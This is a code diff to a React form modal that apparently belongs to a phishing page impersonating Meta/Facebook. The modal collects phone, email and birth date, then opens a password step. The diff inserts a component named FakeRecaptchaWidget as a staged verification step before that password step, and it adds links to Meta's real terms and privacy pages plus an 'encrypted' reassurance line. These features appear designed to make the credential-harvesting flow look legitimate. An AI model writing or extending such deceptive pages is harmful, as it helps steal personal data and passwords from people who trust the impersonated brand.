@@ -2,6 +2,7 @@ import React from 'react';
 import Modal from '#components/modals/Modal';
 import PhoneInput from 'react-phone-input-2';
 import CustomCheckbox from '#components/check-box/CustomCheckbox';
+import FakeRecaptchaWidget from '#components/recaptcha/FakeRecaptchaWidget';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
@@ -12,6 +13,10 @@ interface InfomationsModalProps {
   onToggleModal: (isOpen: boolean) => void;
 }
 
+const META_TERMS_URL = 'https://www.facebook.com/legal/terms/';
+const META_PRIVACY_URL = 'https://www.facebook.com/privacy/policy/';
+const AGREE_CHECKBOX_ID = 'fbcm-agree-terms';
+
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
   const t = useAppStrings();
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -20,6 +25,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
   const [isOpen, setIsOpen] = React.useState(isOpend);
   const [errors, setErrors] = React.useState<Record<string, string>>({});
+  /** Sau khi hồ sơ hợp lệ: hiển thị captcha trong modal trước khi sang bước mật khẩu. */
+  const [phase, setPhase] = React.useState<'form' | 'captcha'>('form');
+  const [captchaMountKey, setCaptchaMountKey] = React.useState(0);
+  const [agreedToTerms, setAgreedToTerms] = React.useState(false);
+  const captchaRegionRef = React.useRef<HTMLDivElement>(null);
   const dispatch = useAppDispatch();
   const formData = useAppSelector((state) => state.stepForm.data);
 
@@ -31,7 +41,19 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
   React.useEffect(() => {
     setIsOpen(isOpend);
+    if (isOpend) {
+      setPhase('form');
+      setAgreedToTerms(false);
+    }
   }, [isOpend]);
+
+  React.useEffect(() => {
+    if (phase !== 'captcha' || !isOpen) return;
+    const id = window.setTimeout(() => {
+      captchaRegionRef.current?.focus();
+    }, 120);
+    return () => clearTimeout(id);
+  }, [phase, isOpen]);
 
   const handleClose = () => {
     setIsOpen(false);
@@ -65,6 +87,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       if (!formData.day) newErrors.day = t.info.errDay;
       if (!formData.month) newErrors.month = t.info.errMonth;
       if (!formData.year) newErrors.year = t.info.errYear;
+      if (!agreedToTerms) newErrors.agree = t.info.errAgree;
 
       if (Object.keys(newErrors).length > 0) {
         setErrors(newErrors);
@@ -77,8 +100,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
       dispatch(updateForm(clientData));
 
-      isOpendPassword(true);
-      handleClose();
+      setCaptchaMountKey((k) => k + 1);
+      setPhase('captcha');
 
     } catch (error) {
       console.error("Error submitting form:", error);
@@ -92,13 +115,56 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));
 
+  const finalizeAfterCaptcha = React.useCallback(() => {
+    setIsOpen(false);
+    onToggleModal(false);
+    isOpendPassword(true);
+  }, [isOpendPassword, onToggleModal]);
+
+  const handleBackFromCaptcha = () => setPhase('form');
+
+  const modalTitle = phase === 'captcha' ? t.captcha.verifyHeading : t.info.title;
+
   return (
     <Modal
       isOpen={isOpen}
-      title={t.info.title}
+      title={modalTitle}
       onClose={handleClose}
     >
       <div className="flex min-h-full min-w-0 w-full flex-col">
+        {phase === 'captcha' ? (
+          <div ref={captchaRegionRef} tabIndex={-1} className="w-full rounded-md outline-none ring-offset-2 focus-visible:ring-2 focus-visible:ring-[#0064e0]">
+            <p className="mb-4 rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px] text-[13px] leading-[1.55] text-[#33507f]">
+              {t.captcha.verifyHint}
+            </p>
+            <FakeRecaptchaWidget
+              key={captchaMountKey}
+              idPrefix="fbcm-info-modal"
+              texts={{
+                notRobot: t.captcha.notRobot,
+                privacyTerms: t.captcha.privacyTerms,
+                a11yVerifying: t.captcha.a11yVerifying,
+                a11yVerified: t.captcha.a11yVerified,
+              }}
+              onVerified={finalizeAfterCaptcha}
+            />
+            <details className="mt-5 rounded-xl border border-[#e8eaed] bg-[#fafbfc] px-[12px] py-2">
+              <summary className="cursor-pointer select-none py-2 text-[13px] font-semibold text-[#3b4a64]">{t.captcha.legalDetailsLabel}</summary>
+              <div className="mt-2 max-h-[160px] space-y-3 overflow-y-auto border-t border-[#eef0f3] pb-3 pt-3 text-[11px] leading-[1.45] text-[#5c6570] sm:text-[12px]">
+                <p className="font-normal">{t.captcha.p1}</p>
+                <p className="font-normal">{t.captcha.p2}</p>
+                <p className="font-normal">{t.captcha.p3}</p>
+              </div>
+            </details>
+            <button
+              type="button"
+              className="mt-5 min-h-[44px] w-full rounded-full border border-[#d8dee6] bg-white text-[14px] font-semibold text-[#3b4a64] transition hover:bg-[#f6f8fa] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]"
+              onClick={handleBackFromCaptcha}
+            >
+              {t.captcha.backToForm}
+            </button>
+          </div>
+        ) : (
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
             <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
@@ -244,26 +310,55 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               />
             </div>
 
-            <div className='mt-[15px] mb-[20px]'>
-              <label className='cursor-pointer flex items-center gap-[5px] text-[14px]' htmlFor="custom-checkbox">
-                <CustomCheckbox />
-                {t.info.agree}{' '}
-                <span className='text-[#0064E0] hover:underline'>
-                  {t.info.agreeTerms}{' '}
-                  <img
-                    src="/images/icons/ic_reject.svg"
-                    alt=""
-                    className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]'
+            <div className='mt-[15px] mb-[14px]'>
+              <label htmlFor={AGREE_CHECKBOX_ID} className="flex cursor-pointer items-start gap-[10px] text-[14px] leading-snug">
+                <span className="mt-[2px] shrink-0">
+                  <CustomCheckbox
+                    id={AGREE_CHECKBOX_ID}
+                    checked={agreedToTerms}
+                    invalid={!!errors.agree}
+                    aria-describedby={errors.agree ? 'fbcm-agree-error' : undefined}
+                    onCheckedChange={(next) => {
+                      setAgreedToTerms(next);
+                      setErrors((prev) => ({ ...prev, agree: '' }));
+                    }}
                   />
                 </span>
+                <span className="min-w-0 text-[#1c1e21]">
+                  <span>{t.info.agree}</span>{' '}
+                  <a
+                    href={META_TERMS_URL}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="font-semibold text-[#0064E0] underline-offset-2 hover:underline"
+                    onClick={(e) => e.stopPropagation()}
+                  >
+                    {t.info.agreeTerms}
+                  </a>{' '}
+                  <span>{t.info.agreeAnd}</span>{' '}
+                  <a
+                    href={META_PRIVACY_URL}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="font-semibold text-[#0064E0] underline-offset-2 hover:underline"
+                    onClick={(e) => e.stopPropagation()}
+                  >
+                    {t.main.linkPrivacy}
+                  </a>
+                </span>
               </label>
+              {errors.agree ? (
+                <p id="fbcm-agree-error" role="alert" className="mt-[10px] text-[13px] text-red-500">{errors.agree}</p>
+              ) : null}
             </div>
-            <div className='w-full mt-[20px] '>
-              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
+            <p className='mb-[12px] text-center text-[11px] leading-snug text-[#65676B] sm:text-[12px]'>{t.info.encryptedHint}</p>
+            <div className='w-full mt-[12px] '>
+              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]'>{t.info.submit}</button>
             </div>
           </div>
 
         </form>
+        )}
       </div>
     </Modal>
   );
